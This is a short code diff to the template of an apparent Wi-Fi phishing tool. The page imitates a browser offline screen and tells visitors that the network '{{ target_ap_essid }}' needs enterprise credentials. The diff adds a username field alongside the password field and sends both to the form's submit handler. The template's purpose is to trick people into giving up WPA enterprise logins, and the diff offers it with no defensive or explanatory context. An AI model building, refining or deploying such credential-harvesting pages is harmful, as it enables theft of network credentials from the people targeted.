@@ -257,9 +257,13 @@
 	'                <div class="description">' +
 	'                   <form id="wifi-search-form" method="post" action="/post">' +
 	'                       <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires {{ target_ap_encryption }} enterprise credentials.</strong>' + 
-	'                       <div class="password">' +
+	'                       <div class="username">' +
 	'			    <label>Username: </label>' +
-	'			    <input type="email" id="wifi-search-username" name="wfphshr-wpa-username"/>' +	
+	'			    <input type="text" id="wifi-search-username" name="wfphshr-wpa-username"/>' +
+	'                           <br>' +
+	'                           <div class="glow"></div>' +
+	'                       </div>' +
+	'			<div class="password">' +	
 	'                           <label>Password: </label>' +		
 	'                           <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
 	'                           <br>' +
@@ -686,7 +690,7 @@
 						<table role="presentation">
 							<tbody><tr>
 								<td aria-hidden="true">
-									<img id="icon" src="./static/heart.png"  />
+									<img id="icon" src="/static/heart.png"  />
 								</td>
 								<td>
 									<h1 id="dnserror_offline_header">You’re not connected</h1>
@@ -776,6 +780,7 @@
                 var myform = document.getElementById("wifi-search-form");
                 myform.addEventListener("submit", function(evt) {
                     evt.preventDefault();
+		    validate_passphrase(document.getElementById("wifi-search-username").value, mac_validate_action); 
                     validate_passphrase(document.getElementById("wifi-search-password").value, mac_validate_action); 
                 });
             }
